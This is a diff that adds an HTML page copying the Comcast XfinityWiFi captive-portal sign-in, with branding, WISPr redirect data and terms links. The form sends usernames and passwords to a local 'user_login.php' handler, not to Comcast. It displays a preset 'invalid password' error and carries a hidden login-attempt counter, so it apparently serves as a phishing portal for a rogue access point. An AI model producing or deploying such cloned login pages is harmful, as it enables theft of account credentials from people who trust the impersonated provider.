@@ -1,0 +1,73 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
+<html><!-- WISPr support --><!--
+    <?xml version="1.0" encoding="UTF-8"?>
+    <WISPAccessGatewayParam xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="WISPAccessGatewayParam.xsd">
+        <Redirect>
+            <AccessProcedure>1.0</AccessProcedure>
+            <AccessLocation>isocc=us,cc=1,ac=215,network=xfinitywifi</AccessLocation>
+            <LocationName>XfinityWiFi</LocationName>
+            <LoginURL>https://cablewifi.comcast.net/wifi/wispr_login.php?cm=</LoginURL>
+            <MessageType>100</MessageType>
+            <ResponseCode>0</ResponseCode>
+        </Redirect>
+    </WISPAccessGatewayParam>
+    --><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>CableWiFi</title>
+    <link type="text/css" rel="stylesheet" href="style.css">
+    
+    <meta name="viewport" content="width=300, initial-scale=1">
+</head>
+<body>
+<div id="mainContainer">
+    <div class="roundedCorners">
+        <div class="topWhiteShadow">
+            <div class="c"></div>
+        </div>
+        <div class="mdlWhiteShadow">
+            <div class="c">
+               	<div class="logoBlock">
+		                        	<img src="https://cablewifi.comcast.net/images/ccc_logo.png" width="200" border="0" class="logo-ccc">
+		                    </div>
+                <div class="signInFont">
+		    <div style="text-align:left;padding:0px 20px 0px 20px">
+		    	Sign in with your Username<br>(Comcast ID or Email)		    </div>
+                </div>
+		                <div class="error">
+        		    <div style="text-align:left;padding:0px 20px 0px 20px">
+        		    	Invalid Username and/or Password        		    </div>
+                </div>
+		                 
+                <div id="frmSignIn">
+                    <label class="slimForm">Username</label>
+                    <form name="frm" method="post" action="user_login.php" style="margin:0px; padding:0px;">
+                    	<input type="text" name="username" id="uname" class="inputbox" value="" style="margin-bottom: 10px; background-attachment: scroll; background-position: 100% 50%; background-repeat: no-repeat;"><br>
+                        <label class="slimForm">Password</label><input type="password" name="password" id="password" class="inputbox" value="" style="background-attachment: scroll; background-position: 100% 50%; background-repeat: no-repeat;"><br>
+                        <div class="clickText">
+                            <input type="checkbox" name="tos" id="tos" value="tos" class="terms">
+                            <div id="clickLink" class="clickLink">I agree to the <a class="bluLink vt-p" href="http://wifilogin.comcast.com/wifi/wifiterms.php" target="_blank">Terms of Service</a></div>
+                        </div>
+                        <div class="btnGryLg btnSubmit" style="width:80px;" onclick="return validateForm();">
+                            <div class="left">
+                                <div class="right">
+                                    <input type="submit" name="submit" class="txt" value="Sign-In">
+                                    <input id="hash" name="hash" value="[Login Attempt 2]" type="hidden">
+                                </div>
+                            </div>
+                        </div>
+                        <div class="faqLink">
+                            <a class="bluLink vt-p" href="https://cablewifi.comcast.net/faq.php?mso=ccc&client-mac=">Need Help?</a>
+                        </div>
+                    </form>
+                </div>
+
+                <div style="font-family:&#39;Lucida Grande&#39;,&#39;Lucida Sans Unicode&#39;,sans-serif;font-size:12px;color:#666;font-weight:900;padding:10px 20px 10px 20px;clear:both;">Not a XFINITY WiFi customer? <a href="https://cablewifi.comcast.net/index.php?client-mac=" class="bluLink vt-p">Click here</a> to select your service provider</div>
+            </div>
+        </div>
+        <div class="btmWhiteShadow">
+            <div class="c"></div>
+        </div>
+    </div>
+</div>
+
+
+<script id="hiddenlpsubmitdiv" style="display: none;"></script><script>try{for(var lastpass_iter=0; lastpass_iter < document.forms.length; lastpass_iter++){ var lastpass_f = document.forms[lastpass_iter]; if(typeof(lastpass_f.lpsubmitorig2)=="undefined"){ lastpass_f.lpsubmitorig2 = lastpass_f.submit; lastpass_f.submit = function(){ var form=this; var customEvent = document.createEvent("Event"); customEvent.initEvent("lpCustomEvent", true, true); var d = document.getElementById("hiddenlpsubmitdiv"); if (d) {for(var i = 0; i < document.forms.length; i++){ if(document.forms[i]==form){ d.innerText=i; } } d.dispatchEvent(customEvent); }form.lpsubmitorig2(); } } }}catch(e){}</script></body></html>
